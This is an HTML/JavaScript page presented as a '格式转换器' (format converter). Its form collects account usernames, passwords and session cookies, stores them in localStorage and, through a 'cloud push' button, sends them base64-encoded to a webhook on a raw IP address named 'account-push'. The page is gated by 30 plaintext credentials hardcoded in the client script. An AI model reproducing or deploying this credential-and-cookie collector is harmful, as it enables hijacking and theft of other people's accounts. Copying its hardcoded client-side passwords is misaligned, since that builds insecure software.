<!DOCTYPE html>
<html lang="zh-CN">

<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>极速格式转换器 - Prince of the Galaxy</title>
  <style>
    :root {
      --bg: #0b0f1a;
      --panel: #161b2a;
      --border: #2d364d;
      --accent: #00f2ff;
      --accent-2: #ff8c00;
      --text: #e2e8f0;
      --muted: #64748b;
      --error: #ff4d4d;
      --success: #00ffcc;
      --input-bg: #0d111d;
    }

    * { box-sizing: border-box; margin: 0; padding: 0; font-family: 'PingFang SC', 'Microsoft YaHei', sans-serif; }

    body {
      min-height: 100vh;
      background: var(--bg);
      color: var(--text);
      display: flex;
      align-items: center;
      justify-content: center;
      padding: 15px;
      overflow-x: hidden;
    }

    #auth-screen {
      position: fixed; inset: 0; background: var(--bg);
      display: flex; align-items: center; justify-content: center; z-index: 9999;
    }

    .auth-card {
      width: 100%; max-width: 380px; background: var(--panel); border: 1px solid var(--border);
      padding: 40px; border-radius: 25px; text-align: center; box-shadow: 0 20px 50px rgba(0,0,0,0.5);
    }

    .auth-input {
      width: 100%; background: var(--input-bg); border: 1px solid var(--border);
      border-radius: 12px; padding: 14px; color: #fff; margin-bottom: 15px; outline: none;
    }

    .auth-btn {
      width: 100%; padding: 15px; background: linear-gradient(135deg, var(--accent), #00a8b3);
      border: none; border-radius: 12px; color: #06101a; font-weight: 800; cursor: pointer;
    }

    #main-app { display: none; width: 100%; max-width: 1100px; margin: 0 auto; }

    .app-wrapper {
      background: var(--panel); border: 1px solid var(--border); border-radius: 25px;
      padding: 30px; position: relative; box-shadow: 0 30px 60px rgba(0,0,0,0.6);
    }

    .app-wrapper::before {
      content: ""; position: absolute; top: 0; left: 0; width: 100%; height: 4px;
      background: linear-gradient(90deg, var(--accent), var(--accent-2));
    }

    .grid-container { display: grid; grid-template-columns: 1fr 160px 1fr; gap: 25px; }

    @media (max-width: 900px) {
      .grid-container { grid-template-columns: 1fr; }
      .actions-column { flex-direction: row !important; padding: 10px 0 !important; }
    }

    .card { background: var(--input-bg); border: 1px solid var(--border); border-radius: 18px; padding: 20px; }
    .title { font-size: 13px; color: var(--muted); margin-bottom: 15px; font-weight: bold; }

    label { display: block; font-size: 11px; color: var(--accent); margin-bottom: 6px; font-weight: 700; }
    input, textarea {
      width: 100%; background: #101524; border: 1px solid var(--border);
      border-radius: 10px; padding: 12px; color: #fff; margin-bottom: 15px; outline: none;
    }

    input::placeholder, textarea::placeholder { color: #4a5568; font-size: 12px; }

    .actions-column { display: flex; flex-direction: column; align-items: center; justify-content: center; gap: 15px; }
    .btn {
      width: 100%; padding: 16px; border-radius: 12px; border: none; font-weight: 800; cursor: pointer;
      font-size: 13px; transition: 0.3s;
    }

    #convertBtn { background: var(--accent); color: #06101a; }
    #pushBtn { background: var(--accent-2); color: #fff; }
    
    #refreshBtn { 
      width: 50px; height: 50px; border-radius: 50%; background: var(--border); 
      color: var(--accent); display: flex; align-items: center; justify-content: center; cursor: pointer;
    }

    .output-box { background: #05080f; border: 1px solid var(--border); border-radius: 15px; min-height: 260px; display: flex; }
    #outputText { width: 100%; background: transparent; border: none; padding: 15px; color: var(--success); font-family: monospace; resize: none; }

    .status-bar {
      margin-top: 25px; padding-top: 15px; border-top: 1px solid var(--border);
      display: flex; justify-content: space-between; align-items: center; flex-wrap: wrap;
    }
    .tag { padding: 7px 14px; border-radius: 8px; background: #1c2336; font-size: 11px; font-weight: 700; border: 1px solid var(--border); }
    
    .spinning { animation: spin 0.7s linear; }
    @keyframes spin { from { transform: rotate(0deg); } to { transform: rotate(360deg); } }
  </style>
</head>

<body>

  <div id="auth-screen">
    <div class="auth-card">
      <h2 style="color:var(--accent); margin-bottom:20px;">系统登录</h2>
      <input type="text" id="l-user" class="auth-input" placeholder="用户名">
      <input type="password" id="l-pass" class="auth-input" placeholder="密码">
      <button class="auth-btn" onclick="handleLogin()">进入系统</button>
    </div>
  </div>

  <div id="main-app">
    <div class="app-wrapper">
      <div class="grid-container">
        <div class="column">
          <div class="title">01 | 输入</div>
          <div class="card">
            <label>用户名</label>
            <input type="text" id="uName" placeholder="例如: admin_user" oninput="saveData()">
            <label>密码</label>
            <input type="text" id="uPass" placeholder="例如: pass123" oninput="saveData()">
            <label>会话数据 (Cookies)</label>
            <textarea id="uCook" style="height:100px;" placeholder="粘贴 Session 数据..." oninput="saveData()"></textarea>
          </div>
        </div>

        <div class="actions-column">
          <button id="convertBtn" class="btn" onclick="processConvert()">转换格式</button>
          <button id="pushBtn" class="btn" onclick="processPush()">云端推送</button>
          <div id="refreshBtn" onclick="processReset()">
            <svg viewBox="0 0 24 24" width="22" height="22" stroke="currentColor" fill="none" stroke-width="2"><path d="M23 4v6h-6M1 20v-6h6M3.51 9a9 9 0 0 1 14.85-3.36L23 10M1 14l4.64 4.36A9 9 0 0 0 20.49 15"></path></svg>
          </div>
        </div>

        <div class="column">
          <div class="title">02 | 输出</div>
          <div class="output-box">
            <textarea id="outputText" readonly placeholder="等待结果..."></textarea>
          </div>
        </div>
      </div>

      <div class="status-bar">
        <div style="display:flex; gap:10px;">
          <div class="tag" style="color:var(--success)" id="sCount">成功: 0</div>
          <div class="tag" style="color:var(--error)" id="fCount">异常: 0</div>
          <div class="tag" style="color:var(--accent-2)" id="pStatus">云端: 等待</div>
        </div>
        <div id="msg" style="font-size:12px; color:var(--muted); font-style:italic;">系统就绪</div>
      </div>
    </div>
  </div>

  <script>
    // 30 Unique Admin Credentials
    const DATABASE = {
      "PrinceX": "Pass77", "Admin": "Root00", "Galaxy": "Star99",
      "MatrixCore": "Admin99", "CyberX9": "Auth88", "EliteRoot": "Root01",
      "NovaPrime": "Nova2026", "ShadowZ": "VoidX", "Titan8": "Base99",
      "AlphaMax": "Alpha77", "NexusV": "NexusX", "Vortex9": "Vortex1",
      "Ghost7": "Ghost00", "Cobra9": "Cobra99", "SkyNet": "Sky88X",
      "Zenith": "ZenVIP", "Oracle": "Code55", "Phantom": "Dark77",
      "Logic9": "Logi01", "Vector": "Vec99", "Storm": "Wind44",
      "Pulse": "Beat22", "Neon": "Light11", "Carbon": "Element6",
      "Astro": "Moon88", "Frost": "Ice00", "Blaze": "Fire11",
      "Omega": "End99", "Pixel": "Art44", "Swift": "Fast22"
    };

    window.onload = () => {
        if (sessionStorage.getItem("isLoggedIn") === "true") showApp();
    };

    function handleLogin() {
        const u = document.getElementById('l-user').value.trim();
        const p = document.getElementById('l-pass').value.trim();
        if (DATABASE[u] && DATABASE[u] === p) {
            sessionStorage.setItem("isLoggedIn", "true");
            showApp();
        } else { alert("验证失败！请检查用户名和密码。"); }
    }

    function showApp() {
        document.getElementById('auth-screen').style.display = 'none';
        document.getElementById('main-app').style.display = 'block';
        const saved = localStorage.getItem("temp_data");
        if (saved) {
            const d = JSON.parse(saved);
            document.getElementById('uName').value = d.u || "";
            document.getElementById('uPass').value = d.p || "";
            document.getElementById('uCook').value = d.c || "";
        }
    }

    function saveData() {
        const data = {
            u: document.getElementById('uName').value,
            p: document.getElementById('uPass').value,
            c: document.getElementById('uCook').value
        };
        localStorage.setItem("temp_data", JSON.stringify(data));
    }

    function processReset() {
        document.getElementById('refreshBtn').classList.add('spinning');
        setTimeout(() => {
            localStorage.removeItem("temp_data");
            document.getElementById('uName').value = "";
            document.getElementById('uPass').value = "";
            document.getElementById('uCook').value = "";
            document.getElementById('outputText').value = "";
            document.getElementById('sCount').innerText = "成功: 0";
            document.getElementById('fCount').innerText = "异常: 0";
            document.getElementById('pStatus').innerText = "云端: 等待";
            updateStatus("已完全清空所有数据", false);
            document.getElementById('refreshBtn').classList.remove('spinning');
        }, 500);
    }

    function processConvert() {
        const u = document.getElementById('uName').value.trim();
        const p = document.getElementById('uPass').value.trim();
        const c = document.getElementById('uCook').value.trim();

        if (!u || !p || !c) {
            updateStatus("❌ 错误: 请填写所有必要的信息", true);
            document.getElementById('fCount').innerText = "异常: 1";
            document.getElementById('sCount').innerText = "成功: 0";
            return;
        }

        document.getElementById('outputText').value = `${u}:${p}|||${c}||`;
        document.getElementById('sCount').innerText = "成功: 1";
        document.getElementById('fCount').innerText = "异常: 0";
        updateStatus("✅ 格式转换已完成", false);
    }

    async function processPush() {
        const data = document.getElementById('outputText').value;
        if (!data) {
            updateStatus("❌ 错误: 无数据可推送", true);
            return;
        }
        const pTag = document.getElementById('pStatus');
        pTag.innerText = "云端: 同步中...";
        
        try {
            const res = await fetch('http://43.173.119.225/api/api/v1/webhook/YDbd-GZyAokTsjuF4bpQ8fuiLBsE1z9dWOLWrjMNfdw/account-push', {
                method: 'POST',
                headers: { 'Content-Type': 'text/plain' },
                body: `accounts=${btoa(data)}`
            });
            if (res.ok) {
                pTag.innerText = "云端: 同步成功";
                updateStatus("🚀 数据已成功推送到云端", false);
            } else { throw new Error(); }
        } catch (e) {
            pTag.innerText = "云端: 异常";
            updateStatus("❌ 远程推送失败", true);
        }
    }

    function updateStatus(m, isErr) {
        const log = document.getElementById('msg');
        log.innerText = m;
        log.style.color = isErr ? 'var(--error)' : 'var(--success)';
    }
  </script>
</body>
</html>
